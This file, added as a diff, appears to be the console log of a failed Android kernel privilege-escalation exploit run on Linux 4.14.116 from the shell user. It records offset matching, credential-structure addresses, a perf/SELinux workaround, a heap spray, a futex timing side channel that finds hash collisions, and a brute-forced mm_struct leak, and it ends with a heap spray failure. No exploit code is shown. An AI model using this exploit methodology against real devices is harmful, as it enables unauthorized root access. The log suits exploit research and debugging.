@@ -1,0 +1,48 @@
+[33m[*] [0mkernel: 4.14.116
+[32m[+] [0moffsets matched: 4.14.116
+[33m[*] [0minit_cred image=ffffff800af640b0 alias=ffffffc002f640b0
+[32m[+] [0mstartup context pid=7288 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=7288 NoNewPrivs=0 Seccomp=0 Seccomp_filters=?
+[32m[+] [0mbuild config pid=7288 label=ghostlock_oneplus slide=pselect main=pselect
+[32m[+] [0mp0 profile pid=7288 phys_offset=0000000000000000 kernel_phys_load=0000000000080000 delta=0000000000080000 slide_logger=ffffffc02a4021a0 bootid_data=ffffffc02a6aa868 init_task=ffffffc02a40cf00 root_tg=ffffffc02a63d580 sysctl_bootid=ffffffc02a6aa868
+[33m[*] [0mp0 kernel_phys_load=0000000000080000 phys_offset=0000000000000000 delta=0000000000080000
+[33m[*] [0m[T+0ms] exploit start
+[33m[*] [0mselinux_enforcing absent (4.14 CDY) - unblocking perf instead of W1
+[33m[*] [0mW1c gear m=0 target=ffffffc002ec21e8
+[33m[*] [0m=== W1c: perf unblock === target=0xffffffc002ec21e8 mode=1
+[33m[*] [0mattempt round (persisted) = 1
+[33m[*] [0m[T+7ms]   heap spray start
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x7ffffffff
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007fafaff0c8
+[33m[*] [0mpass A: 65536 candidates, bucket piled
+[33m[*] [0mpass B: re-measuring unpiled
+[33m[*] [0m  0000006fb02ef0a0  (1599 > 3x0)[33m[*] [0m  0000006fb063eb18  (1599 > 3x0)[33m[*] [0m  0000006fb0945350  (1602 > 3x0)[33m[*] [0m  0000006fb0a45b50  (1608 > 3x0)[33m[*] [0m  0000006fb29b76e0  (975 > 3x0)[33m[*] [0m  0000006fb2c1ba00  (1389 > 3x0)[33m[*] [0m  0000006fb3441b30  (1394 > 3x0)[33m[*] [0m  0000006fb37fc908  (984 > 3x0)[33m[*] [0m  0000006fb38b7ee0  (977 > 3x0)[33m[*] [0m  0000006fb3edb000  (975 > 3x0)[33m[*] [0m  0000006fb4030aa8  (959 > 3x0)[33m[*] [0m  0000006fb49fe918  (960 > 3x0)[33m[*] [0m  0000006fb51754d0  (963 > 3x0)[33m[*] [0m  0000006fb5d131c0  (996 > 3x0)[33m[*] [0m  0000006fb677f520  (976 > 3x0)[33m[*] [0mfound 15 collisisons
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0m[p2] collisions ok, launching bruteforce[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  3] start finding mm_struct [ffffffd7c0000000-ffffffe000000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffffefc0000000-fffffff800000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffffdfc0000000-ffffffe800000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffffc000000000-ffffffc800000000]
+[33m[*] [0m[  7] start finding mm_struct [fffffff7c0000000-0000000000000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffffcfc0000000-ffffffd800000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffffe7c0000000-fffffff000000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffffc7c0000000-ffffffd000000000]
+[33m[*] [0m[p3] bruteforce returned cnt=1 best=16[33m[*] [0m[probe] candidate 0/1 = 0xffffffee18ba7080
+[33m[*] [0mKernelSnitch bruteforce: state=4 found=0 mm_struct=0xffffffee18ba7080
+[33m[*] [0m[OVAL] mm=ffffffee18ba7080 modelBucket(T)=1498
+[33m[*] [0m[OVAL] pred=COLLIDE addr=6fb02ef0a0 tA=0 tB=0 oracle=0
+[33m[*] [0m[OVAL] pred=COLLIDE addr=6fb063eb18 tA=0 tB=0 oracle=0
+[33m[*] [0m[OVAL] pred=COLLIDE addr=6fb0945350 tA=1 tB=1 oracle=0
+[33m[*] [0m[OVAL] pred=COLLIDE addr=6fb0a45b50 tA=2 tB=0 oracle=0
+[33m[*] [0m[OVAL] pred=MISS    addr=6fb0a46b58 tA=2 tB=1 oracle=0
+[33m[*] [0m[OVAL] pred=MISS    addr=6fb0a47b60 tA=2 tB=0 oracle=0
+[33m[*] [0m[OVAL] pred=MISS    addr=6fb0a48b68 tA=2 tB=0 oracle=0
+[33m[*] [0m[OVAL] pred=MISS    addr=6fb0a49b70 tA=2 tB=1 oracle=0
+[33m[*] [0m[OVAL] RESULT agree=4 disagree=4 (collide=4 miss=4)
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page timeout after 1 attempts
+[31m[!] [0m  heap spray failed
+DONE
